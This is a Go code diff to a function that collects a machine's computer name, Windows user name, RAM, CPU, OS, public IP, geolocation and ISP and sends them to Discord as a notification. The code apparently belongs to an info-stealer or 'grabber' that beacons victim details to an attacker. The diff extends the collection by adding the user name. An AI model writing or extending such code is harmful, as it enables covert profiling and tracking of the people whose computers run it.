@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 	"strings"
 )
 
@@ -40,10 +41,11 @@ type DiscordEmbedThumbnail struct {
 
 func SendDiscordNotification() error {
 	computerInfo := []string{
-		fmt.Sprintf("**Computer Name:** `%s`", GetComputerName()),
-		fmt.Sprintf("💾 **RAM:** %d MB", GetRAMUsage()),
-		fmt.Sprintf("**CPU:** %s", GetCpuName()),
-		fmt.Sprintf("**OS:** %s", GetFullOSName()),
+		fmt.Sprintf("🖥️ **Computer Name:** `%s`", os.Getenv("COMPUTERNAME")),
+		fmt.Sprintf("👤 **User Name:** `%s`", os.Getenv("USERNAME")),
+		fmt.Sprintf("💾 **RAM:** %.0f GB", GetRAMTotal()),
+		fmt.Sprintf("🧠 **CPU:** %s", GetCpuName()),
+		fmt.Sprintf("🪟 **OS:** %s", GetFullOSName()),
 	}
 	ipInfo, err := GetIPInfo()
 	if err != nil {
@@ -62,7 +64,7 @@ func SendDiscordNotification() error {
 				{
 					Name: "📍 IP Info",
 					Value: fmt.Sprintf(
-						"**IP:** `%s`\n📍 **Location:** %s, %s, %s :flag_%s:\n**ISP:** `%s`",
+						"**🌐 IP:** `%s`\n📍 **Location:** %s, %s, %s :flag_%s:\n**📡 ISP:** `%s`",
 						ipInfo.IP, ipInfo.City, ipInfo.Region, ipInfo.Country, strings.ToLower(ipInfo.Country), ipInfo.Org,
 					),
 					Inline: true,
